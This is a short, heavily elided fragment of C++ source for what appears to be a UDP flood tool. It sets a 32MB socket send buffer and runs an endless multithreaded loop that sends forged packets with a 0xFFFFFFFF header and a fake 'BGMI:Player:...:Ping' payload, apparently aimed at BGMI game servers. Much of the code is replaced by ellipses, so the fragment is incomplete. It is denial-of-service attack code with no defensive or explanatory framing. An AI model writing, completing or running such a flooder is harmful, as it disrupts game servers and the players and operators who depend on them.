...
private:
    ...
    int create_socket() {
        ...
        int sendbuf = 32 * 1024 * 1024; // 32MB send buffer
    ...
    void flood_thread() {
        ...
        while (true) {
            ...
            for (int i = 0; i < MAX_PACKETS_PER_SEC / NUM_THREADS; ++i) {
                ...
                const unsigned char header[] = {0xFF, 0xFF, 0xFF, 0xFF}; // Changed to unsigned char
                snprintf(packet, PACKET_SIZE, "%.*sBGMI:Player:%s:Ping:%d", 
                         4, (const char*)header, name.c_str(), rand() % 1000); // Cast to char* for snprintf
